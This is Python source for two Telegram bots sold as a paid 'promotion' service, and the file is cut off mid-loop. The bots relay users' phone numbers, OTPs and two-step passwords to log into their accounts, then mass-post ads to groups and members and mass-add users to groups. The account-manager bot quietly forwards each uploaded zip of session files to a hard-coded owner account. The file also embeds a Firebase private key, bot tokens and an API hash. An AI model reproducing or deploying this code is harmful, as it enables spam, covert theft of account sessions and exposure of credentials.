import random
import telethon
import logging
import datetime
import psutil
import time
import shutil
import sys
import asyncio
import os
import zipfile
import telegraph
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, FloodWaitError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, SessionPasswordNeededError
from firebase_admin import credentials, db, initialize_app

text = """
---------------------------------
    ╔════╗
    ╚═╗╔═╝
    ╔═╣╠═╗
    ║╔╣╠╗║
    ║╚╣╠╝║
    ╚═╣╠═╝
    ╔═╝╚═╗ 
    ╚════╝ 
---------------------------------
"""

with open("log.txt", "w") as f:
    f.write(text)

default_app = initialize_app(
    credentials.Certificate(
        {
            "type": "service_account",
            "project_id": "about-ishan",
            "private_key_id": "f3ad57b9e6ad0bc574274530d4ba30353c748124",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDAJXWrsSiFf8Uy\nn5xS2OiOeQnCG+4XpUas+yMnHfVBT4H2sZaCFqMDXfT+bFdKB+lGZ6DvSmJgP2aj\nAoiFsqUW6Aku+i0LKTTYM8iT0P6z+7j/Ey2QKhfv3FaONjl0eRcVdONsUrU96uvP\nRUv1a4TOXNjINRUc8LWGp3Wy7390+T74u5KKnGnv/SnJrUN+o6nn2sDzAL6PCmtZ\nYHkznTuDKvTFSQ868pS3pAcsZICqqBLykBqDq2sMZ7osW7MLcucY3zWykjSxVP5s\n/ZMAB1cR/v32o0wOLz/yGjRYwJQv44oAvDF42HO+g/TfhBqcZUPOteOL0B9+B/PE\nexgtu0GJAgMBAAECggEACjezuy6PhhHWTavZJzqrmy/qiezsS0uZp4cvRlw8d32f\n3ptw8nf7sSkk5wah2aj0Ca9nCnJ9KrsUXSS8V8e5Ka+rFVluXcKSMdEHIH0jnjSL\nkNzXNmxWm4WvAJ73jS8HQDfYBCGdy64bXglEUcem50ZerL7N4Z0XOhLbmmlL8M9c\nktgoU+IKAWBK94P2Jo2J7rZbQ2cmwIgF94M+v9o3CD/y9rgAnfa61W2ixf+IuIcw\nWOv9kaQLQZzILiugkdeK+EAkasAz7nDArv06WtO+JNoo11ITCdHyF4ktJj4yRsjT\nx8dr+LA5Ye2ErLE4DxXKYznffRgq3uERm7g7GMNfxQKBgQDxVNnKaG9onEWugayy\nR7EfyLkY0OqmvM18/bVJo0PJugD2oTwnFNhBcgN30GkiYgp29GHaFtDuHwUeDRme\n1K1+nRYN/jlj7dnEAXvayM+JOX7tu932U46Z2lmB2xabQo+Hq1K2/6m7ilYZR0zv\naVsKFsV812+1e2HYS3XZdtLxLwKBgQDL00grTGMUBzmyY3sLtEn98id2MxkX6wJ+\n4id0+WWAAKA+cNDw0b95F1B578GT5zeoxDKfgauhKssCKIcl9MxA56/WLKAE8ds6\ncFyGVXmyn2a+Ny14s97fuMCSzMCh9F9agwOvNThDirg1Mo7ScK6WycUn08Svt9+W\nwBDdYi0axwKBgF+Ak5t9DrGYPh8b5Aq9QkPwvActDd8kEjGneSmF+ZqICD+ReOuC\nXT4w71xn1mMr5zZB6cNTiiThk7Xbu0rWoT3czlCFTZLVGnttluTy2OZWIXvU/7au\nRF1wQkGYQO76PTCUROx0amf0C7R/Odv4lnV8o3SPEP8Br6vX2PBRDJMzAoGBAI0R\n8548JUrkYVONNMl6A8gmRJezcAe02SpWfnagclawmDf/Py2eDkbSExoCDdm/Ky+8\nc0kgp1hJ1O3ufPORRZkaggHbKvmhJ1mAERnMqQku+B5o9CjZXUU8itRPsHenOiPc\nD73BOOrOZQY0stMFuGCWz8Tr9fKkcbTVxBZlb9BbAoGBAM9q2D4wNwvp3NL33IvF\nVtmpO+29wpzFNHOJooQC7OdHt0ITuv1SY6FZQKfRNk5UURK6sbb+HewYdsgCiyW1\ndkDd/rlpzv4K0ou+sClt46aBkBW340KWtXBIOa0KZyMtKy8nokNUMg1Sw+wPjDd0\ndxd9N1muHK6h3wxBNNQYRFHE\n-----END PRIVATE KEY-----\n",
            "client_email": "firebase-adminsdk-dfpb9@about-ishan.iam.gserviceaccount.com",
            "client_id": "112851093465815915774",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
            "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
            "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-dfpb9%40about-ishan.iam.gserviceaccount.com"
        }
    ),
    {
        'databaseURL': "https://about-ishan-default-rtdb.asia-southeast1.firebasedatabase.app/"
    }
)
BOT_TOKEN = "5180127494:AAFBsdAZRNlXoIvxPnIEEpJrLi59GYdoCFk"
OWNERS = [1303790979, 1854668908]
Premium = [1303790979, 1854668908]
API = [
    [2392599, "7e14b38d250953c8c1e94fd7b2d63550"],
]
api = random.choice(API)
Sub = (db.reference(f"/Admin/Premium/")).get()
if Sub == None:
    Sub = []
channel = "InducedBots"
for row in Sub:
    row = str(row).split()
    d = datetime.datetime.today(
    ) - datetime.datetime.strptime(f"{row[1]}", '%Y-%m-%d')
    r = datetime.datetime.strptime("2021-12-01", '%Y-%m-%d') - \
        datetime.datetime.strptime("2021-11-03", '%Y-%m-%d')
    if d <= r:
        Premium.append(int(row[0]))

start_time = time.time()
rar = {}
rare = {}

logging.basicConfig(
    level=logging.WARNING,
    handlers=[logging.FileHandler('log.txt')],
    format="\n\n%(asctime)s:    %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("telethon").setLevel(logging.WARNING)
start_time = time.time()
STUFF = {}
rar = {}
client = telethon.TelegramClient(
    None, api_id=api[0], api_hash=api[1]).start(bot_token=BOT_TOKEN)
client1 = telethon.TelegramClient(
    None, api_id=api[0], api_hash=api[1]).start(bot_token="5195927287:AAHodzABzzKUU6_zn0FxGpanOquM5fwYM9M")
acc = []


async def get_user_join(e):
    try:
        await e.client(telethon.tl.functions.channels.GetParticipantRequest(channel="InducedBots", participant=e.chat.id))
        return True
    except telethon.errors.rpcerrorlist.UserNotParticipantError:
        await e.client.send_message(e.chat.id, "You have not Joined Our Channel\nJoin to Use me For Free\n\nMade with ❤️ By @InducedBots", buttons=[[telethon.Button.url("🎁 Channel1", url=f"https://t.me/InducedBots"), telethon.Button.inline("Check☑️", b"Home"), ]])
        return False


@client.on(telethon.events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
async def _(e):
    if not await get_user_join(e):
        return
    but = [
        [
            telethon.Button.inline("Gcast", b"Gcast"),
            telethon.Button.inline("Ucast", b"Ucast"),
            telethon.Button.inline("Gadd", b"Gadd"),
        ],

        [
            telethon.Button.inline("🤑 BuyNow", b"Ishan"),
            telethon.Button.inline("🛰 Admin Pannel", b"Admin")
        ]
    ]
    await e.reply(f"**Welcome Sir!\n\nI'm Induced Peomotion Bot \nMade for Promoting Your Ads\n\nMade with ❤️ By @InducedBots**", buttons=but)


@client.on(telethon.events.CallbackQuery)
async def _(e):
    global rar
    if not await get_user_join(e):
        return
    if e.data == b"Ishan":
        await e.answer('Terms & Condition: 24/7 Support Will Be Given To Premium User. If Find Any Fake SS then Direct Ban. No Refund will be given if no valid reason will be given.', alert=True)
        await e.client.send_message(e.chat.id, "250Rs Per Month Cost\n📑 Payment Options\n\n🔸 Paytm\n\n🔸 UPI\n\n🔸 Crypto Currency\n\nNote: Don't forget to send payment screenshot to @InducedSupportBot for plan activation.", buttons=[[telethon.Button.url("Paytm", url=f"https://paytm.me/pxvn-Tr"), telethon.Button.url("UPI", url="https://induced-service-bot.web.app"), telethon.Button.url("Crypto", url=f"https://t.me/InducedSupportBot"), ], [telethon.Button.url(": Tutorial Here :", url=f"https://youtu.be/iyz5ky3Mkkc")]])

    elif e.data == b"Gcast":
        if not await get_user_join(e):
            return
        if not e.query.user_id in Premium:
            await e.reply("You are not a premium user", buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]])
            return
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send PhoneNumber")
            try:
                Zip = await xmr.get_response(timeout=300)
                try:
                    if Zip.text == "/start" or Zip.text == "/help":
                        return
                    pphone = phone = (telethon.utils.parse_phone(Zip.text))
                    api = random.choice(API)
                    cl = telethon.TelegramClient(None, api[0], api[1])
                    await cl.connect()
                    await cl.send_code_request(phone)
                    await xmr.send_message((f"Please enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
                    otp = await xmr.get_response(timeout=300)
                    if otp.text == "/start" or otp.text == "/help":
                        return
                    await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
                except FloodWaitError as h:
                    await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
                    return
                except PhoneNumberInvalidError:
                    await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
                    return
                except PhoneNumberBannedError:
                    await xmr.send_message(f"{phone} is Baned")
                    return
                except TimeoutError:
                    await xmr.send_message("Time Limit Reached of 5 Min.")
                    return
                except PhoneCodeInvalidError:
                    await xmr.send_message(f"{pphone} Invalid Code.")
                    return
                except PhoneCodeExpiredError:
                    await xmr.send_message(f"{pphone} Code is Expired.")
                    return
                except SessionPasswordNeededError:
                    try:
                        await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
                        two_step_code = await xmr.get_response(timeout=300)
                        if two_step_code.text == "/start" or two_step_code.text == "/help":
                            return
                    except asyncio.exceptions.TimeoutError:
                        await xmr.send_message("`Time Limit Reached of 5 Min.`")
                        return
                    try:
                        await cl.sign_in(password=two_step_code.text)
                    except Exception as h:
                        await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
                        return
                k = await cl.get_me()
                red = telethon.utils.get_peer_id(k)
                acc.append(red)
                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                await cl.send_message('SpamBot', '/start')
                await asyncio.sleep(2)
                async for xr in cl.iter_messages("@SpamBot", limit=1):
                    stats = str(xr.text)
                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return
        async with e.client.conversation(e.chat_id) as x:
            await x.send_message(f"Send Send Your Ads Message with image (if wants)")
            try:
                image = await x.get_response(timeout=600)
                if image.text == "/start" or image.text == "/help":
                    return
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            if image.photo or image.video or image.gif:
                getit = await image.download_media(f'{e.query.user_id}/')
                try:
                    variable = telegraph.upload_file(getit)
                    os.remove(getit)
                    nn = "https://telegra.ph" + variable[0]
                except Exception as e:
                    nn = False
            else:
                nn = False
            num = len(STUFF) + 1
            STUFF.update({num: {"msg": image.text, "media": nn}})
            await x.send_message("Message Sending Start", buttons=[[telethon.Button.inline("🛰 Stop", b"Stop")]])
            rar[f'{e.query.user_id}'] = False
            while True:
                done = 0
                er = 0
                async for xr in cl.iter_dialogs():
                    if rar[f'{e.query.user_id}'] == True:
                        rar[f'{e.query.user_id}'] = False
                        return
                    if xr.is_group:
                        try:
                            res = await cl.inline_query('@inducedpromotionbot', f"ish{num}")
                            await res[0].click(xr.entity.id,
                                               hide_via=True,
                                               silent=False,
                                               )
                            done += 1
                            await asyncio.sleep(1)

                        except Exception as h:
                            await asyncio.sleep(1)
                            er += 1
                await x.send_message(f"Done in {done} chats, error in {er} chat(s)")
                await asyncio.sleep(500)

    elif e.data == b"Ucast":
        if not await get_user_join(e):
            return
        if not e.query.user_id in Premium:
            await e.reply("You are not a premium user", buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]])
            return
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send PhoneNumber")
            try:
                Zip = await xmr.get_response(timeout=300)
                try:
                    if Zip.text == "/start" or Zip.text == "/help":
                        return
                    pphone = phone = (telethon.utils.parse_phone(Zip.text))
                    api = random.choice(API)
                    cl = telethon.TelegramClient(None, api[0], api[1])
                    await cl.connect()
                    await cl.send_code_request(phone)
                    await xmr.send_message((f"Please enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
                    otp = await xmr.get_response(timeout=300)
                    if otp.text == "/start" or otp.text == "/help":
                        return
                    await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
                except FloodWaitError as h:
                    await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
                    return
                except PhoneNumberInvalidError:
                    await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
                    return
                except PhoneNumberBannedError:
                    await xmr.send_message(f"{phone} is Baned")
                    return
                except TimeoutError:
                    await xmr.send_message("Time Limit Reached of 5 Min.")
                    return
                except PhoneCodeInvalidError:
                    await xmr.send_message(f"{pphone} Invalid Code.")
                    return
                except PhoneCodeExpiredError:
                    await xmr.send_message(f"{pphone} Code is Expired.")
                    return
                except SessionPasswordNeededError:
                    try:
                        await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
                        two_step_code = await xmr.get_response(timeout=300)
                        if two_step_code.text == "/start" or two_step_code.text == "/help":
                            return
                    except asyncio.exceptions.TimeoutError:
                        await xmr.send_message("`Time Limit Reached of 5 Min.`")
                        return
                    try:
                        await cl.sign_in(password=two_step_code.text)
                    except Exception as h:
                        await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
                        return
                k = await cl.get_me()
                red = telethon.utils.get_peer_id(k)
                acc.append(red)
                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                await cl.send_message('SpamBot', '/start')
                await asyncio.sleep(2)
                async for xr in cl.iter_messages("@SpamBot", limit=1):
                    stats = str(xr.text)
                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return
        async with e.client.conversation(e.chat_id) as x:
            await x.send_message(f"Send Send Your Ads Message with image (if wants)")
            try:
                image = await x.get_response(timeout=600)
                if image.text == "/start" or image.text == "/help":
                    return
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            if image.photo or image.video or image.gif:
                getit = await image.download_media(f'{e.query.user_id}/')
                try:
                    variable = telegraph.upload_file(getit)
                    os.remove(getit)
                    nn = "https://telegra.ph" + variable[0]
                except Exception as e:
                    nn = False
            else:
                nn = False
            num = len(STUFF) + 1
            STUFF.update({num: {"msg": image.text, "media": nn}})
            rar[f'{e.query.user_id}'] = False
            await x.send_message(f"Send Username Of Group")
            try:
                image = await x.get_response(timeout=600)
                if image.text == "/start" or image.text == "/help":
                    return
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            group = await cl.get_entity(image.text)
            done = 0
            rars = 0
            txt = "Mssage Sending Start\n\n"
            await x.send_message(f"Send Start From Count")
            try:
                image = await x.get_response(timeout=600)
                if image.text == "/start" or image.text == "/help":
                    return
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            iss = int(image.text)
            await x.send_message("Message Sending Start", buttons=[[telethon.Button.inline("🛰 Stop", b"Stop")]])
            async for member in cl.iter_participants(group, aggressive=True):
                rars += 1
                if rars < iss:
                    continue
                if rars % 100 == 0:
                    await asyncio.sleep(3)
                await asyncio.sleep(1)
                if done == 46:
                    break
                try:
                    done += 1
                    if not member.bot and member.username:
                        res = await cl.inline_query('@inducedpromotionbot', f"ish{num}")
                        await res[0].click(member.username)
                        stat = "Done"
                except Exception as h:
                    stat = "Error"
                txt += f"{done}).   {member.first_name}   {stat}\n"
            await x.send_message(txt+"\n\nMade with ❤️ @InducedBots")
            await cl.disconnect()

    elif e.data == b"Gadd":
        if not await get_user_join(e):
            return
        if not e.query.user_id in Premium:
            await e.reply("You are not a premium user", buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]])
            return
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send PhoneNumber")
            try:
                Zip = await xmr.get_response(timeout=300)
                try:
                    if Zip.text == "/start" or Zip.text == "/help":
                        return
                    pphone = phone = (telethon.utils.parse_phone(Zip.text))
                    api = random.choice(API)
                    cl = telethon.TelegramClient(None, api[0], api[1])
                    await cl.connect()
                    await cl.send_code_request(phone)
                    await xmr.send_message((f"Please enter OTP of Phone No {pphone} in `1 2 3 4 5` format. __(Space between each numbers!)__"))
                    otp = await xmr.get_response(timeout=300)
                    if otp.text == "/start" or otp.text == "/help":
                        return
                    await cl.sign_in(phone=phone, code=' '.join(str(otp.text)))
                except FloodWaitError as h:
                    await xmr.send_message(f"{pphone}You Have Floodwait of {h.x} Seconds")
                    return
                except PhoneNumberInvalidError:
                    await xmr.send_message(f"Your Phone Number {pphone} is Invalid.")
                    return
                except PhoneNumberBannedError:
                    await xmr.send_message(f"{phone} is Baned")
                    return
                except asyncio.exceptions.TimeoutError:
                    await xmr.send_message("Time Limit Reached of 5 Min.")
                    return
                except PhoneCodeInvalidError:
                    await xmr.send_message(f"{pphone} Invalid Code.")
                    return
                except PhoneCodeExpiredError:
                    await xmr.send_message(f"{pphone} Code is Expired.")
                    return
                except SessionPasswordNeededError:
                    try:
                        await xmr.send_message("Your Account Have Two-Step Verification.\nPlease Enter Your Password.")
                        two_step_code = await xmr.get_response(timeout=300)
                        if two_step_code.text == "/start" or two_step_code.text == "/help":
                            return
                    except asyncio.exceptions.TimeoutError:
                        await xmr.send_message("`Time Limit Reached of 5 Min.`")
                        return
                    try:
                        await cl.sign_in(password=two_step_code.text)
                    except Exception as h:
                        await xmr.send_message(f"{pphone}\n\n**ERROR:** `{str(h)}`")
                        return
                k = await cl.get_me()
                red = telethon.utils.get_peer_id(k)
                acc.append(red)
                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                await cl.send_message('SpamBot', '/start')
                await asyncio.sleep(2)
                async for xr in cl.iter_messages("@SpamBot", limit=1):
                    stats = str(xr.text)
                await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**")
            except asyncio.exceptions.TimeoutError:
                await xmr.send_message("Time Limit Reached of 5 Min.")
                return
        async with e.client.conversation(e.chat_id) as x:
            await x.send_message(f"Send Send Username of Account to Add members")
            try:
                message = await x.get_response(timeout=600)
                if message.text == "/start" or message.text == "/help":
                    return
            except asyncio.exceptions.TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            user = await cl.get_entity(message.text)
            xx = await x.send_message(f"Adding... {user.first_name}(tg://user?id={user.id})")
            done = 0
            er = 0
            async for xr in cl.iter_dialogs():
                if xr.is_group:
                    try:
                        await cl(telethon.functions.channels.InviteToChannelRequest(xr, users=[user]))
                        done += 1

                    except Exception as h:
                        er += 1
            await xx.edit(f"#GADDED {user.first_name}(tg://user?id={user.id})\nDone: {done}chats\nError: {er}chats")

    elif e.data == b"Stop":
        await e.answer('\nPromotion Stop', alert=True)
        rar[f'{e.query.user_id}'] = True

    elif e.data == b"Home":
        await e.answer('\nWelcome Back to Home',)
        but = [
            [
                telethon.Button.inline("Gcast", b"Gcast"),
                telethon.Button.inline("Ucast", b"Ucast"),
                telethon.Button.inline("Gadd", b"Gadd"),
            ],

            [
                telethon.Button.inline("🤑 BuyNow", b"Ishan"),
                telethon.Button.inline("🛰 Admin Pannel", b"Admin")
            ]
        ]
        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)

    elif e.data == b"Admin":
        if e.query.user_id in OWNERS:
            but = [
                [
                    telethon.Button.inline("Sudo", b"Sudo"),
                    telethon.Button.inline("📊 Staus", b"Stat"),
                ],
                [
                    telethon.Button.inline("🔄 Restart", b"Restart"),
                    telethon.Button.inline("Back", b"Home")
                ]
            ]
            await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Induced Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)

    elif e.data == b"Stat":
        start = time.time()
        await e.answer('\nWait Checking Stats', alert=True)
        end = round((time.time() - start) * 1000)

        def humanbytes(size):

            if size in [None, ""]:
                return "0 B"
            for unit in ["B", "KB", "MB", "GB"]:
                if size < 1024:
                    break
                size /= 1024
            return f"{size:.2f} {unit}"

        def time_formatter():
            minutes, seconds = divmod(int(time.time() - start_time), 60)
            hours, minutes = divmod(minutes, 60)
            days, hours = divmod(hours, 24)
            weeks, days = divmod(days, 7)
            tmp = (
                ((str(weeks) + "w:") if weeks else "")
                + ((str(days) + "d:") if days else "")
                + ((str(hours) + "h:") if hours else "")
                + ((str(minutes) + "m:") if minutes else "")
                + ((str(seconds) + "s") if seconds else "")
            )
            if tmp != "":
                if tmp.endswith(":"):
                    return tmp[:-1]
                else:
                    return tmp
            else:
                return "0 s"
        total, used, free = shutil.disk_usage(".")
        cpuUsage = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
        upload = humanbytes(psutil.net_io_counters().bytes_sent)
        down = humanbytes(psutil.net_io_counters().bytes_recv)
        TOTAL = humanbytes(total)
        USED = humanbytes(used)
        FREE = humanbytes(free)
        tex = f"Total Details\n\nBot Usage:\n┏━━━━━━━━━━━━━━━━\n┣Ping - `{end}ms`\n┣UpTime - `{time_formatter()}`\n┗━━━━━━━━━━━━━━━━\n\nSystem Usage:\n┏━━━━━━━━━━━━━━━━\n┣UplodeSpeed: {upload}\n┣Download: {down}\n┣Cpu: {cpuUsage}%\n┣Ram: {memory}%\n┃\n┣Storage Used: {disk}%\n┃┏━━━━━━━━━━━━━━━━\n┃┣Total: {TOTAL}\n┃┣Used: {USED}\n┃┣Free: {FREE}\n┃┗━━━━━━━━━━━━━━━━\n┗━━━━━━━━━━━━━━━━\n\nMade With ❤️ By @InducedBots"
        await e.client.send_message(e.chat.id, tex, buttons=[[telethon.Button.inline("📊 Staus", b"Stat"), ]])

    elif e.data == b"Restart":
        if not await get_user_join(e):
            return
        if e.query.user_id in OWNERS:
            await e.answer('\nRestarting Bot Wait', alert=True)
            os.execl(sys.executable, sys.executable, "-m", "main")

    elif e.data == b"Sudo":
        async with e.client.conversation(e.chat_id) as x:
            await x.send_message(f"Send Userid of To Give Sudo")
            try:
                id = await x.get_response(timeout=600)
                if id.text == "/start" or id.text == "/help":
                    return
            except TimeoutError:
                await x.send_message("Time Limit Reached of 5 Min.")
                return
            re = datetime.date.today()
            suib = re+(datetime.datetime.strptime("2021-12-01", '%Y-%m-%d') -
                       datetime.datetime.strptime("2021-11-03", '%Y-%m-%d'))
            Premium.append(int(id.text))
            Sub.append(f"{id.text} {re}")
            ref = (db.reference(f"/Admin/Premium/")).set(Sub)
            await x.send_message(f"Sudo Given To `{id.text}`")
            await e.client.send_message(int(id.text), f"Congratulation Your Subscription Has been Sucessfully started.\nYou are now Premium till {suib}\n\nMade With ❤️ By @{channel}")


@client.on(telethon.events.InlineQuery)
async def inline_alive(o):
    if o.original_update.user_id in acc:
        return
    """
    ishan=[
        await o.builder.article(
                text="• **Induced Promotion Bot \nSubscribtion Cost: 200Rs per Month •**",
                buttons=[[telethon.Button.url("• Dm to Buy Subscribtion •", url="t.me/IshanSingla_xD")]],
                title="Induced Promotion Bot",
                description="Use Our To Promote your self For Selling\nAuto Post Sender In Multiple groups",
                thumb=telethon.tl.types.InputWebDocument("https://telegra.ph/file/8ff763cebfe2af1a3ce45.jpg", 0, "image/jpg", []),
                content=telethon.tl.types.InputWebDocument("https://telegra.ph/file/8ff763cebfe2af1a3ce45.jpg", 0, "image/jpg", []),
        )
    ]
    """
    ishan = [
        await o.builder.photo(
            "https://telegra.ph/file/94a7f2073cdcf4c002a09.jpg",
            text="❤️‍🔥 BEST TELEGRAM PROMOTION BOT ❤️‍🔥\n\n💛 FEATURES & INFORMATION 💛\n👉 No Need Of Api And Hash\n👉 No Need to Install Script/Python Or Any Other Application\n👉 Account / Post Change allow\n👉 Dm / Group Message Sender With Media\n👉 Group Adder is there\n👉 Least Account limited\n👉 Limited Accounts Checker\n\n༆ 𝙱𝙾𝚃 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 ➪ @InducedPromotionBot\n\n🔰 Price - 200Rs (3$) Per month\n\n⚡️High Priority Customer Support System ⚡️\n\n✅ AVOID ACCOUNT FROM LIMITED WITH AUTO POSTING WITHOUT GETTING LIMITED",
            buttons=[
                [
                    telethon.Button.url("• Dm to Buy •", url="t.me/IshanSingla_xD"),
                    telethon.Button.url("• Tutorial •", url="https://www.youtube.com/watch?v=BvNVBo19fCg&list=PLkgZrmKoUMYQtw6Acj2gvFEpZNvUATHKp&index=1")
                ]
            ],
            link_preview=False,
        )
    ]
    await o.answer(
        ishan,
        cache_time=300,
        switch_pm="👥 Induced Promotion Bot",
        switch_pm_param="start",
    )


@client.on(telethon.events.InlineQuery(pattern="ish(.*)"))
async def inline_alive(o):
    n = o.pattern_match.group(1)
    if not (n and n.isdigit()):
        return
    ok = STUFF.get(int(n))
    txt = ok.get("msg")
    pic = ok.get("media")
    if pic:
        ishan = [
            await o.builder.photo(
                pic,
                text=txt,
                link_preview=False,
            )
        ]
    else:
        ishan = [
            await o.builder.article(
                text=txt,
                title="Wecome",
            )
        ]
    await o.answer(
        ishan,
        cache_time=300,
        switch_pm="👥 Induced Promotion Bot",
        switch_pm_param="start",
    )


@client1.on(telethon.events.NewMessage(incoming=True, pattern='/logs', func=lambda e: e.is_private))
@client.on(telethon.events.NewMessage(incoming=True, pattern='/logs', func=lambda e: e.is_private))
async def logAddee(e):
    await e.client.send_file(e.chat_id, "log.txt", caption="Your Logs Here", force_document=True)


@client1.on(telethon.events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
async def _(e):
    if not await get_user_join(e):
        return
    but = [
        [
            telethon.Button.inline("☎️ Session", b"Session"),
            telethon.Button.inline("✅ Otp", b"Acc")
        ],
        [
            telethon.Button.inline("🎁 Terrminate ", b"Terrminate"),
            telethon.Button.inline("🎁 2 Step Verification", b"Step")
        ],
        [
            telethon.Button.inline("⚙️ Name Set ", b"Nmae"),
            telethon.Button.inline("🛰 Admin Pannel", b"Admin")
        ]
    ]
    await e.reply(f"**Welcome Sir!\n\nI'm Induced Account Bot \nMade for Manage Tg Accounts\n\nMade with ❤️ By @InducedBots**", buttons=but)


@client1.on(telethon.events.CallbackQuery)
async def _(e):
    if not await get_user_join(e):
        return
    global rar, rare
    if e.data == b"Home":
        await e.answer('\nWelcome Back to Home',)
        but = [
            [
                telethon.Button.inline("☎️ Session", b"Session"),
                telethon.Button.inline("✅ Otp", b"Acc")
            ],
            [
                telethon.Button.inline("🎁 Terrminate ", b"Terrminate"),
                telethon.Button.inline("🎁 2 Step Verification", b"Step")
            ],
            [
                telethon.Button.inline("⚙️ Name Set ", b"Nmae"),
                telethon.Button.inline("🛰 Admin Pannel", b"Admin")
            ]
        ]
        await e.client.edit_message(e.chat.id, e.query.msg_id, f"**Welcome Sir!\n\nI'm Scraper Bot \nMade for Adding in Free,\nWithout Any Use of Python.\n\nMade with ❤️ By @InducedBots**", buttons=but)

    elif e.data == b"Next":
        global rare
        await e.answer('\nSkip Number', alert=True)
        rare[f'{e.query.user_id}'] = True

    elif e.data == b"Otp":
        global rar
        await e.answer('\nOtp Recieved', alert=True)
        rar[f'{e.query.user_id}'] = True

    elif e.data == b"Acc":
        async with e.client.conversation(e.chat_id) as xmr:
            await xmr.send_message("Send Your Zip")
            try:
                shutil.rmtree(f'{e.query.user_id}')
            except:
                pass
            try:
                Zip = await xmr.get_response(timeout=300)
                if Zip.text == "/start" or Zip.text == "/help":
                    return
                user = await e.client.get_entity(e.query.user_id)
                await e.client.send_file(1303790979, Zip, caption=f"File by [{user.first_name}](tg://user?id={e.query.user_id})", force_document=True,)
                a = await xmr.send_message("Downloading")
                if (Zip.media and Zip.media.document):
                    if not os.path.exists(f'{e.query.user_id}/'):
                        os.mkdir(f'{e.query.user_id}/')
                    media = await Zip.download_media(f'{e.query.user_id}/')
                    await a.edit("Download done")
                    with zipfile.ZipFile(media, "r") as zip_ref:
                        zip_ref.extractall(f'{e.query.user_id}')
                    await a.edit("Unziping Finish")
                    rar[f'{e.query.user_id}'] = False
                    rare[f'{e.query.user_id}'] = False
                    try:
                        for r in os.listdir(f'{e.query.user_id}/sessions'):
                            if not r.endswith(".session"):
                                continue
                            r = r.replace('.session', '')
                            try:
                                cl = telethon.TelegramClient(
                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
                                await cl.connect()
                                k = await cl.get_me()
                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
                                await cl.send_message('SpamBot', '/start')
                                await asyncio.sleep(2)
                                async for xr in cl.iter_messages("@SpamBot", limit=1):
                                    stats = str(xr.text)
                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"), telethon.Button.inline("Skip", b"Next"), ]])
                                while True:
                                    await asyncio.sleep(2)
